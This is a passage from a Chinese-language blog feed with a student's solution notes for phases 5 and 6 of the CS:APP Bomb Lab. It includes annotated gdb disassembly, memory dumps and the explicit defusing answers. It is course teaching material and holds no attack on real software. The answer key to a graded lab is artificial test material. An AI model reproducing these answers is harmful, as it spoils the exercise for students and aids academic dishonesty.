class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">%rdi &amp;input</span><br><span class="line">Dump of assembler code for function phase_5:</span><br><span class="line">    0x0000000000401062 &lt;+0&gt;:push   %rbx</span><br><span class="line">    0x0000000000401063 &lt;+1&gt;:sub    $0x20,%rsp</span><br><span class="line">    0x0000000000401067 &lt;+5&gt;:mov    %rdi,%rbx            &#x2F;&#x2F;rbx &#x3D; &amp;input</span><br><span class="line">    0x000000000040106a &lt;+8&gt;:mov    %fs:0x28,%rax        &#x2F;&#x2F;rax &#x3D; &amp;fs+28      详见注解p5_1</span><br><span class="line">    0x0000000000401073 &lt;+17&gt;:mov    %rax,0x18(%rsp)      &#x2F;&#x2F;栈18储存&amp;fs+28</span><br><span class="line">    0x0000000000401078 &lt;+22&gt;:xor    %eax,%eax            &#x2F;&#x2F;自我异或, 等价于ax置0</span><br><span class="line">    0x000000000040107a &lt;+24&gt;:callq  0x40131b &lt;string_length&gt; &#x2F;&#x2F;检测rdi的长度</span><br><span class="line">    0x000000000040107f &lt;+29&gt;:cmp    $0x6,%eax            </span><br><span class="line">    0x0000000000401082 &lt;+32&gt;:je     0x4010d2 &lt;phase_5+112&gt;   &#x2F;&#x2F;长度&#x3D;6 转112</span><br><span class="line">    0x0000000000401084 &lt;+34&gt;:callq  0x40143a &lt;explode_bomb&gt;  &#x2F;&#x2F;长度!&#x3D;6,炸</span><br><span class="line">    0x0000000000401089 &lt;+39&gt;:jmp    0x4010d2 &lt;phase_5+112&gt;</span><br><span class="line">    0x000000000040108b &lt;+41&gt;:movzbl (%rbx,%rax,1),%ecx       &#x2F;&#x2F;cx &#x3D; (ax+bx) &#x3D; input[ax]</span><br><span class="line">    0x000000000040108f &lt;+45&gt;:mov    %cl,(%rsp)               &#x2F;&#x2F;栈0 &#x3D; cl</span><br><span class="line">    0x0000000000401092 &lt;+48&gt;:mov    (%rsp),%rdx              &#x2F;&#x2F;dx &#x3D; 栈0</span><br><span class="line">    0x0000000000401096 &lt;+52&gt;:and    $0xf,%edx                &#x2F;&#x2F;dx^f 取后4位</span><br><span class="line">    0x0000000000401099 &lt;+55&gt;:movzbl 0x4024b0(%rdx),%edx      &#x2F;&#x2F;dx &#x3D; (0x4024b0+dx) 这里比较复杂,详见注解p5_2,p5_3</span><br><span class="line">    0x00000000004010a0 &lt;+62&gt;:mov    %dl,0x10(%rsp,%rax,1)    &#x2F;&#x2F;栈10+ax &#x3D; dl </span><br><span class="line">    0x00000000004010a4 &lt;+66&gt;:add    $0x1,%rax                &#x2F;&#x2F;ax+&#x3D;1</span><br><span class="line">    0x00000000004010a8 &lt;+70&gt;:cmp    $0x6,%rax                &#x2F;&#x2F;ax与6比较</span><br><span class="line">    0x00000000004010ac &lt;+74&gt;:jne    0x40108b &lt;phase_5+41&gt;    &#x2F;&#x2F;不为6 继续循环至41</span><br><span class="line">    &#x2F;&#x2F;对输入的每个字符依次运算,根据运算结果取出特定内存中的字符,依次存储在栈10~栈16处</span><br><span class="line">    0x00000000004010ae &lt;+76&gt;:movb   $0x0,0x16(%rsp)          &#x2F;&#x2F;栈16&#x3D;0</span><br><span class="line">    0x00000000004010b3 &lt;+81&gt;:mov    $0x40245e,%esi           &#x2F;&#x2F;si&#x3D;0x40245e</span><br><span class="line">    0x00000000004010b8 &lt;+86&gt;:lea    0x10(%rsp),%rdi          &#x2F;&#x2F;di&#x3D;栈10</span><br><span class="line">    0x00000000004010bd &lt;+91&gt;:callq  0x401338 &lt;strings_not_equal&gt; &#x2F;&#x2F;栈10与0x40245e比较</span><br><span class="line">    0x00000000004010c2 &lt;+96&gt;:test   %eax,%eax                    &#x2F;&#x2F;对于ax (strings_not_equal的返回值)</span><br><span class="line">    0x00000000004010c4 &lt;+98&gt;:je     0x4010d9 &lt;phase_5+119&gt;       &#x2F;&#x2F;返回值1(不同) 炸 相同转119</span><br><span class="line">    0x00000000004010c6 &lt;+100&gt;:callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">    0x00000000004010cb &lt;+105&gt;:nopl   0x0(%rax,%rax,1)</span><br><span class="line">    0x00000000004010d0 &lt;+110&gt;:jmp    0x4010d9 &lt;phase_5+119&gt;</span><br><span class="line">    0x00000000004010d2 &lt;+112&gt;:mov    $0x0,%eax                    &#x2F;&#x2F;ax置0</span><br><span class="line">    0x00000000004010d7 &lt;+117&gt;:jmp    0x40108b &lt;phase_5+41&gt;        &#x2F;&#x2F;转41</span><br><span class="line">    0x00000000004010d9 &lt;+119&gt;:mov    0x18(%rsp),%rax              &#x2F;&#x2F;ax&#x3D;栈18</span><br><span class="line">    0x00000000004010de &lt;+124&gt;:xor    %fs:0x28,%rax                &#x2F;&#x2F;栈18 与fs+28异或</span><br><span class="line">    0x00000000004010e7 &lt;+133&gt;:je     0x4010ee &lt;phase_5+140&gt;       &#x2F;&#x2F;相同 转140 解决</span><br><span class="line">    0x00000000004010e9 &lt;+135&gt;:callq  0x400b30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">    0x00000000004010ee &lt;+140&gt;:add    $0x20,%rsp</span><br><span class="line">    0x00000000004010f2 &lt;+144&gt;:pop    %rbx</span><br><span class="line">    0x00000000004010f3 &lt;+145&gt;:retq</span><br></pre></td></tr></table></figure><p>注:</p><ol><li>代码中+8~+17,+119~+133部分涉及到了对于段寄存器fs的操作, 这是进行了栈保护, 避免栈的缓冲区溢出.此处将金丝雀值(canary)存入栈18处, 并备份在fs段,结束时比较canary是否被修改, 并调用栈检查失败函数(__stack_chk_fail) . 更多参见教材3.10章缓冲区溢出部分.</li><li>24~34 检测输入字符串长度, 若!=6 直接炸</li><li>41~74 对串中的六个字符依次运算,根据运算结果取出特定内存中的映射字符,依次存储在栈10~栈16处</li><li>76~98 比较取出来的映射字符是否与地址 <code>0x40245e</code>中的字符串(flyers)一致, 相同则炸弹拆除.</li></ol><h4 id="注解p5-1"><a href="#注解p5-1" class="headerlink" title="注解p5_1"></a>注解p5_1</h4><p>​    fs段寄存器</p><p>​    8086CPU将内存分段，并设计了 4 个段寄存器，CS，DS，ES 和 SS，分别用于指令、数据、其它和堆栈。</p><p>​    FS、GS 是从 80386 开始增加的两个辅助段寄存器，没有全称，取名就是按字母序排在 CS、DS、ES 之后的。 </p><h4 id="注解p5-2"><a href="#注解p5-2" class="headerlink" title="注解p5_2"></a>注解p5_2</h4><p>char 类型占有1个字节(8bits)的空间, 代码中对于每个字符, 取后四位代码, 并加上0x4024b0得到映射字符的地址, 并将得到的映射字符存入栈中的对应位置.例如当字符串的第二个字符为O时, 会进行如下操作:</p><blockquote><p>字符<code>O</code>对应的ASCAII码为 <code>0x4f</code></p><p>取后四位代码 <code>0xf</code></p><p>得到映射字符的地址 <code>0x4024bf</code></p><p>访问该地址, 得到映射字符<code>l</code> , 并存入栈11处 (11是第二个字符对应栈中的位置)</p></blockquote><h4 id="注解p5-3"><a href="#注解p5-3" class="headerlink" title="注解p5_3"></a>注解p5_3</h4><p><strong><code>0x4024b0</code>附近存储的字符</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">(gdb) print (char) *(0x4024b0+0x0)</span><br><span class="line">$1 &#x3D; 109 &#39;m&#39;</span><br><span class="line">(gdb) print (char) *(0x4024b0+0x1)</span><br><span class="line">$2 &#x3D; 97 &#39;a&#39;</span><br><span class="line">(gdb) print (char) *(0x4024b0+0x2)</span><br><span class="line">$3 &#x3D; 100 &#39;d&#39;</span><br><span class="line">(gdb) print (char) *(0x4024b0+0x3)</span><br><span class="line">$4 &#x3D; 117 &#39;u&#39;</span><br><span class="line">(gdb) print (char) *(0x4024b0+0x4)</span><br><span class="line">$5 &#x3D; 105 &#39;i&#39;</span><br><span class="line">(gdb) print (char) *(0x4024b0+0x5)</span><br><span class="line">$6 &#x3D; 101 &#39;e&#39;</span><br><span class="line">(gdb) print (char) *(0x4024b0+0x6)</span><br><span class="line">$7 &#x3D; 114 &#39;r&#39;</span><br><span class="line">(gdb) print (char) *(0x4024b0+0x7)</span><br><span class="line">$8 &#x3D; 115 &#39;s&#39;</span><br><span class="line">(gdb) print (char) *(0x4024b0+0x8)</span><br><span class="line">$9 &#x3D; 110 &#39;n&#39;</span><br><span class="line">(gdb) print (char) *(0x4024b0+0x9)</span><br><span class="line">$10 &#x3D; 102 &#39;f&#39;</span><br><span class="line">(gdb) print (char) *(0x4024b0+0xa)</span><br><span class="line">$11 &#x3D; 111 &#39;o&#39;</span><br><span class="line">(gdb) print (char) *(0x4024b0+0xb)</span><br><span class="line">$12 &#x3D; 116 &#39;t&#39;</span><br><span class="line">(gdb) print (char) *(0x4024b0+0xc)</span><br><span class="line">$13 &#x3D; 118 &#39;v&#39;</span><br><span class="line">(gdb) print (char) *(0x4024b0+0xd)</span><br><span class="line">$14 &#x3D; 98 &#39;b&#39;</span><br><span class="line">(gdb) print (char) *(0x4024b0+0xe)</span><br><span class="line">$15 &#x3D; 121 &#39;y&#39;</span><br><span class="line">(gdb) print (char) *(0x4024b0+0xf)</span><br><span class="line">$16 &#x3D; 108 &#39;l&#39;</span><br></pre></td></tr></table></figure><p><strong><code>0x40245e</code> 储存的字符</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) print (char*) 0x40245e</span><br><span class="line">$17 &#x3D; 0x40245e &quot;flyers&quot;</span><br></pre></td></tr></table></figure><p><strong>偶然发现的一个彩蛋</strong></p><p>回到 <code>0x4024b0</code>附近, 理论上可能映射到的字符地址应该是从 <code>0x4024b0</code>~<code>0x4024bf</code> , 但实际上<code>0x4024c0</code>以及后面有字符可以取到, 如果调用的不是查看地址对应的字符, 而是字符串的话, 会发现下面一段话:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) print (char*) 0x4024b0</span><br><span class="line">$18 &#x3D; 0x4024b0 &lt;array&gt; &quot;maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?&quot;</span><br></pre></td></tr></table></figure><p>前16个字符就是我们用于解题的字符, 后面居然还有一句来自教授的吐槽LOL😂</p><h3 id="Phase-6"><a href="#Phase-6" class="headerlink" title="Phase_6"></a>Phase_6</h3><ul><li>输入: *input</li><li>功能: 输入六个数字</li><li>调用: read_six_numbers</li><li>返回: 0</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">%rdi &amp;input</span><br><span class="line">Dump of assembler code for function phase_6:</span><br><span class="line">   0x00000000004010f4 &lt;+0&gt;:push   %r14</span><br><span class="line">   0x00000000004010f6 &lt;+2&gt;:push   %r13</span><br><span class="line">   0x00000000004010f8 &lt;+4&gt;:push   %r12</span><br><span class="line">   0x00000000004010fa &lt;+6&gt;:push   %rbp</span><br><span class="line">   0x00000000004010fb &lt;+7&gt;:push   %rbx</span><br><span class="line">   0x00000000004010fc &lt;+8&gt;:sub    $0x50,%rsp</span><br><span class="line">   0x0000000000401100 &lt;+12&gt;:mov    %rsp,%r13</span><br><span class="line">   0x0000000000401103 &lt;+15&gt;:mov    %rsp,%rsi</span><br><span class="line">   0x0000000000401106 &lt;+18&gt;:callq  0x40145c &lt;read_six_numbers&gt;  &#x2F;&#x2F;读入6个数字</span><br><span class="line">   0x000000000040110b &lt;+23&gt;:mov    %rsp,%r14</span><br><span class="line">   0x000000000040110e &lt;+26&gt;:mov    $0x0,%r12d   </span><br><span class="line">   0x0000000000401114 &lt;+32&gt;:mov    %r13,%rbp                &#x2F;&#x2F;rbp&#x3D;r13 外循环1起始</span><br><span class="line">   0x0000000000401117 &lt;+35&gt;:mov    0x0(%r13),%eax              </span><br><span class="line">   0x000000000040111b &lt;+39&gt;:sub    $0x1,%eax                &#x2F;&#x2F;ax&#x3D;(r13)-1</span><br><span class="line">   0x000000000040111e &lt;+42&gt;:cmp    $0x5,%eax                &#x2F;&#x2F;ax与5比较</span><br><span class="line">   0x0000000000401121 &lt;+45&gt;:jbe    0x401128 &lt;phase_6+52&gt;    &#x2F;&#x2F;ax&gt;5 炸</span><br><span class="line">   0x0000000000401123 &lt;+47&gt;:callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000401128 &lt;+52&gt;:add    $0x1,%r12d               &#x2F;&#x2F;r12++  r12为外循环索引</span><br><span class="line">   0x000000000040112c &lt;+56&gt;:cmp    $0x6,%r12d               &#x2F;&#x2F;比较r12与6</span><br><span class="line">   0x0000000000401130 &lt;+60&gt;:je     0x401153 &lt;phase_6+95&gt;    &#x2F;&#x2F;循环6次 结束转95(外循环 1)</span><br><span class="line">   0x0000000000401132 &lt;+62&gt;:mov    %r12d,%ebx</span><br><span class="line">   0x0000000000401135 &lt;+65&gt;:movslq %ebx,%rax                &#x2F;&#x2F;里循环起始</span><br><span class="line">   0x0000000000401138 &lt;+68&gt;:mov    (%rsp,%rax,4),%eax       &#x2F;&#x2F;ax &#x3D; 栈[r12]</span><br><span class="line">   0x000000000040113b &lt;+71&gt;:cmp    %eax,0x0(%rbp)           &#x2F;&#x2F;比较(r13)与ax</span><br><span class="line">   0x000000000040113e &lt;+74&gt;:jne    0x401145 &lt;phase_6+81&gt;    &#x2F;&#x2F;不等于 转81 等于 炸</span><br><span class="line">   0x0000000000401140 &lt;+76&gt;:callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000401145 &lt;+81&gt;:add    $0x1,%ebx                &#x2F;&#x2F;bx++ bx为里循环索引</span><br><span class="line">   0x0000000000401148 &lt;+84&gt;:cmp    $0x5,%ebx                </span><br><span class="line">   0x000000000040114b &lt;+87&gt;:jle    0x401135 &lt;phase_6+65&gt;    &#x2F;&#x2F;若bx&lt;&#x3D;5, 即数2~数5 循环65 (里循环 2)</span><br><span class="line">   0x000000000040114d &lt;+89&gt;:add    $0x4,%r13                &#x2F;&#x2F;现在数6,r13&#x3D;下一个数字栈地址</span><br><span class="line">   0x0000000000401151 &lt;+93&gt;:jmp    0x401114 &lt;phase_6+32&gt;    &#x2F;&#x2F;转32(外循环) </span><br><span class="line">   &#x2F;&#x2F;循环12: 外循环保证每个数字均∈[1,6] , 里循环保证数字各不相同</span><br><span class="line">   &#x2F;&#x2F;方便起见, 称输入的6个数字为a[i],i∈[0,5]</span><br><span class="line">   0x0000000000401153 &lt;+95&gt;:lea    0x18(%rsp),%rsi          &#x2F;&#x2F;rsi&#x3D;栈+24 (栈0~20存储数1-6)</span><br><span class="line">   0x0000000000401158 &lt;+100&gt;:mov    %r14,%rax                &#x2F;&#x2F;ax&#x3D;栈0地址</span><br><span class="line">   0x000000000040115b &lt;+103&gt;:mov    $0x7,%ecx                &#x2F;&#x2F;cx&#x3D;7</span><br><span class="line">   0x0000000000401160 &lt;+108&gt;:mov    %ecx,%edx                &#x2F;&#x2F;dx &#x3D; cx       循环3起始</span><br><span class="line">   0x0000000000401162 &lt;+110&gt;:sub    (%rax),%edx              &#x2F;&#x2F;dx -&#x3D; *ax</span><br><span class="line">   0x0000000000401164 &lt;+112&gt;:mov    %edx,(%rax)              &#x2F;&#x2F;*ax &#x3D; dx</span><br><span class="line">   0x0000000000401166 &lt;+114&gt;:add    $0x4,%rax                &#x2F;&#x2F;ax指向下一个数字  ax为循环3索引</span><br><span class="line">   0x000000000040116a &lt;+118&gt;:cmp    %rsi,%rax                &#x2F;&#x2F;如果ax!&#x3D;栈+24</span><br><span class="line">   0x000000000040116d &lt;+121&gt;:jne    0x401160 &lt;phase_6+108&gt;   &#x2F;&#x2F;转108 循环3</span><br><span class="line">   0x000000000040116f &lt;+123&gt;:mov    $0x0,%esi                &#x2F;&#x2F;si &#x3D; 0   </span><br><span class="line">   0x0000000000401174 &lt;+128&gt;:jmp    0x401197 &lt;phase_6+163&gt;   &#x2F;&#x2F;转163         循环3结束</span><br><span class="line">   &#x2F;&#x2F;循环3: 使每数1-数6与原地对7取补(1-&gt;6,2-&gt;5) 称取补后的数为b[i]&#x3D;7-a[i]</span><br><span class="line">   0x0000000000401176 &lt;+130&gt;:mov    0x8(%rdx),%rdx           &#x2F;&#x2F;dx +&#x3D; 0x8</span><br><span class="line">   0x000000000040117a &lt;+134&gt;:add    $0x1,%eax                &#x2F;&#x2F;ax++</span><br><span class="line">   0x000000000040117d &lt;+137&gt;:cmp    %ecx,%eax                &#x2F;&#x2F;比较数补与ax</span><br><span class="line">   0x000000000040117f &lt;+139&gt;:jne    0x401176 &lt;phase_6+130&gt;   &#x2F;&#x2F;不等 转130</span><br><span class="line">   0x0000000000401181 &lt;+141&gt;:jmp    0x401188 &lt;phase_6+148&gt;   &#x2F;&#x2F;等 转148</span><br><span class="line">   0x0000000000401183 &lt;+143&gt;:mov    $0x6032d0,%edx           &#x2F;&#x2F;dx &#x3D; 0x6032d0</span><br><span class="line">   0x0000000000401188 &lt;+148&gt;:mov    %rdx,0x20(%rsp,%rsi,2)   &#x2F;&#x2F;(栈+2*si+32)&#x3D;dx</span><br><span class="line">   0x000000000040118d &lt;+153&gt;:add    $0x4,%rsi                &#x2F;&#x2F;si+&#x3D;4         si作为循环4索引</span><br><span class="line">   0x0000000000401191 &lt;+157&gt;:cmp    $0x18,%rsi               &#x2F;&#x2F;若si&#x3D;&#x3D;24 </span><br><span class="line">   0x0000000000401195 &lt;+161&gt;:je     0x4011ab &lt;phase_6+183&gt;   &#x2F;&#x2F;转183         循环4结束</span><br><span class="line">   0x0000000000401197 &lt;+163&gt;:mov    (%rsp,%rsi,1),%ecx       &#x2F;&#x2F;cx &#x3D; (栈+si)  循环4起始 </span><br><span class="line">   0x000000000040119a &lt;+166&gt;:cmp    $0x1,%ecx                &#x2F;&#x2F;cx 与 1比较</span><br><span class="line">   0x000000000040119d &lt;+169&gt;:jle    0x401183 &lt;phase_6+143&gt;   &#x2F;&#x2F;若cx&lt;&#x3D;1 转143 </span><br><span class="line">   0x000000000040119f &lt;+171&gt;:mov    $0x1,%eax                &#x2F;&#x2F;ax &#x3D; 1</span><br><span class="line">   0x00000000004011a4 &lt;+176&gt;:mov    $0x6032d0,%edx           &#x2F;&#x2F;dx &#x3D; 0x6032d0</span><br><span class="line">   0x00000000004011a9 &lt;+181&gt;:jmp    0x401176 &lt;phase_6+130&gt;   &#x2F;&#x2F;转130</span><br><span class="line">   &#x2F;&#x2F;循环4: 使(栈32+8*(i-1))&#x3D;0x6032d0+b[i]*16 </span><br><span class="line">   &#x2F;&#x2F;称地址 栈32+8*(i-1) 为d0~d5</span><br><span class="line">   &#x2F;&#x2F;称其中储存的数据,即0x6032d0+b[i]*16,为k0~k5</span><br><span class="line">   0x00000000004011ab &lt;+183&gt;:mov    0x20(%rsp),%rbx          &#x2F;&#x2F;bx &#x3D; k[0]</span><br><span class="line">   0x00000000004011b0 &lt;+188&gt;:lea    0x28(%rsp),%rax          &#x2F;&#x2F;ax &#x3D; &amp;k[1] &#x3D; d[0]</span><br><span class="line">   0x00000000004011b5 &lt;+193&gt;:lea    0x50(%rsp),%rsi          &#x2F;&#x2F;si &#x3D; &amp;栈+0x50 &#x3D; d[6]</span><br><span class="line">   0x00000000004011ba &lt;+198&gt;:mov    %rbx,%rcx                &#x2F;&#x2F;cx &#x3D; bx</span><br><span class="line">   0x00000000004011bd &lt;+201&gt;:mov    (%rax),%rdx              &#x2F;&#x2F;dx &#x3D; (ax)  循环5起始</span><br><span class="line">   0x00000000004011c0 &lt;+204&gt;:mov    %rdx,0x8(%rcx)           &#x2F;&#x2F;cx+8储存dx 例如 k0+8储存k1 k4+8储存k5</span><br><span class="line">   0x00000000004011c4 &lt;+208&gt;:add    $0x8,%rax                &#x2F;&#x2F;ax &#x3D; &amp;(下一个)</span><br><span class="line">   0x00000000004011c8 &lt;+212&gt;:cmp    %rsi,%rax</span><br><span class="line">   0x00000000004011cb &lt;+215&gt;:je     0x4011d2 &lt;phase_6+222&gt;   &#x2F;&#x2F;循环5结束 转222</span><br><span class="line">   0x00000000004011cd &lt;+217&gt;:mov    %rdx,%rcx                &#x2F;&#x2F;rcx &#x3D; k5  </span><br><span class="line">   0x00000000004011d0 &lt;+220&gt;:jmp    0x4011bd &lt;phase_6+201&gt;   &#x2F;&#x2F;转201</span><br><span class="line">   &#x2F;&#x2F;循环5:  k0+8储存k1 v4+8储存k5</span><br><span class="line">   &#x2F;&#x2F;若将k[i]作为地址,指向数字v[i]</span><br><span class="line">   0x00000000004011d2 &lt;+222&gt;:movq   $0x0,0x8(%rdx)           &#x2F;&#x2F;k5+8储存0</span><br><span class="line">   0x00000000004011da &lt;+230&gt;:mov    $0x5,%ebp                &#x2F;&#x2F;bp&#x3D;5  作为索引</span><br><span class="line">   0x00000000004011df &lt;+235&gt;:mov    0x8(%rbx),%rax           &#x2F;&#x2F;ax &#x3D; (k[i]+8) &#x3D; k[i+1]   循环6起始</span><br><span class="line">   0x00000000004011e3 &lt;+239&gt;:mov    (%rax),%eax              &#x2F;&#x2F;ax &#x3D; (k[i+1]) &#x3D; v[i+1]</span><br><span class="line">   0x00000000004011e5 &lt;+241&gt;:cmp    %eax,(%rbx)              &#x2F;&#x2F;比较(rbx) 与 ax , bx&#x3D;k[i], (bx)&#x3D;v[i]</span><br><span class="line">   0x00000000004011e7 &lt;+243&gt;:jge    0x4011ee &lt;phase_6+250&gt;   &#x2F;&#x2F;若(rbx)&gt;ax 转 250</span><br><span class="line">   0x00000000004011e9 &lt;+245&gt;:callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x00000000004011ee &lt;+250&gt;:mov    0x8(%rbx),%rbx           &#x2F;&#x2F;bx+&#x3D;8</span><br><span class="line">   0x00000000004011f2 &lt;+254&gt;:sub    $0x1,%ebp                &#x2F;&#x2F;bp-1  </span><br><span class="line">   0x00000000004011f5 &lt;+257&gt;:jne    0x4011df &lt;phase_6+235&gt;   &#x2F;&#x2F;循环6</span><br><span class="line">   &#x2F;&#x2F;循环6: 保证v[i]&gt;v[i+1]</span><br><span class="line">   0x00000000004011f7 &lt;+259&gt;:add    $0x50,%rsp               </span><br><span class="line">   0x00000000004011fb &lt;+263&gt;:pop    %rbx</span><br><span class="line">   0x00000000004011fc &lt;+264&gt;:pop    %rbp</span><br><span class="line">   0x00000000004011fd &lt;+265&gt;:pop    %r12</span><br><span class="line">   0x00000000004011ff &lt;+267&gt;:pop    %r13</span><br><span class="line">   0x0000000000401201 &lt;+269&gt;:pop    %r14</span><br><span class="line">   0x0000000000401203 &lt;+271&gt;:retq</span><br></pre></td></tr></table></figure><p>注: </p><ul><li>代码中一共涉及到6个循环体</li><li>我们称输入的原数为a[i], i∈[0,5]</li><li>循环1, 循环2 为一个二重嵌套循环, 循环1为外循环, 循环2为里循环</li><li>循环1保证输入的每个数字都属于[1,6]</li><li>循环2保证输入的每个数字两两相异</li><li>循环3 使每数1-数6与原地对7取补(1-&gt;6,2-&gt;5) 称取补后的数为b[i]=7-a[i]</li><li>循环4: <ul><li>对于每个i, 称地址 $栈32+8\times(i-1)$ 为d[0]~d[5] </li><li>对于每个i, 称数据 $0x6032d0+b[i]\times 16$ 为k[0]-k[5]</li><li>在 d[i] 中储存 k[i]</li><li>k[i] 也可以作为地址, 对应数据成为v[i]</li></ul></li><li>循环5:在<code>k[i] + 8</code> 处储存 <code>k[i+1],</code> 这一步是为了后续操作的方便</li><li>循环6: 必须保证<code>v[i]&gt;v[i+1]</code></li></ul><h4 id="注解p6-1"><a href="#注解p6-1" class="headerlink" title="注解p6_1"></a>注解p6_1</h4><p>0x6032d0附近储存的值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">(gdb) print *(int*) (0x6032d0+16*0)</span><br><span class="line">$83 &#x3D; 332</span><br><span class="line"></span><br><span class="line">(gdb) print *(int*) (0x6032d0+16*1)</span><br><span class="line">$84 &#x3D; 168</span><br><span class="line"></span><br><span class="line">(gdb) print *(int*) (0x6032d0+16*2)</span><br><span class="line">$85 &#x3D; 924</span><br><span class="line"></span><br><span class="line">(gdb) print *(int*) (0x6032d0+16*3)</span><br><span class="line">$86 &#x3D; 691</span><br><span class="line"></span><br><span class="line">(gdb) print *(int*) (0x6032d0+16*4)</span><br><span class="line">$88 &#x3D; 477</span><br><span class="line"></span><br><span class="line">(gdb) print *(int*) (0x6032d0+16*5)</span><br><span class="line">$89 &#x3D; 443</span><br></pre></td></tr></table></figure><h4 id="注解p6-2"><a href="#注解p6-2" class="headerlink" title="注解p6_2"></a>注解p6_2</h4><p>因此, 若使得v[0]~v[5]依次为924,691,477,443,332,168</p><p>则b[i]-1 应依次为: 2,3,4,5,0,1</p><p>原值a[i] 应依次为: 4,3,2,1,6,5</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>炸弹实验室从6月25日开始, 至7月1日凌晨两点完成. </p><p>掌握了gdb调试方法, 和简单汇编语言的阅读能力, 对其中的数据储存, 数据基本计算, 函数调用, 分支与循环的体现, 栈与内存的分配等内容有了基本了解. </p><p>后来在参考其他博客的笔记时发现还有一个隐藏炸弹. 先放置吧, 有时间会来填坑.</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这是我在2020年6月26日~7月1日完成的Bomb Lab的题解与笔记&lt;/p&gt;
&lt;p&gt;炸弹实验室是CS:APP 配套实验中的第二个实验, 通过对二进制文件反汇编来分析获得拆除炸弹的密码.&lt;/p&gt;
&lt;p&gt;本文显式地包含答案, 如果你想自己解决,不建议使用本文.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/luy-0/CS-APP-LABs/tree/master/Lab-Answer_HB/Lab2-BombLab&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;对应Github仓库 点我&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="学习笔记" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="乘龙术" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%B9%98%E9%BE%99%E6%9C%AF/"/>
    
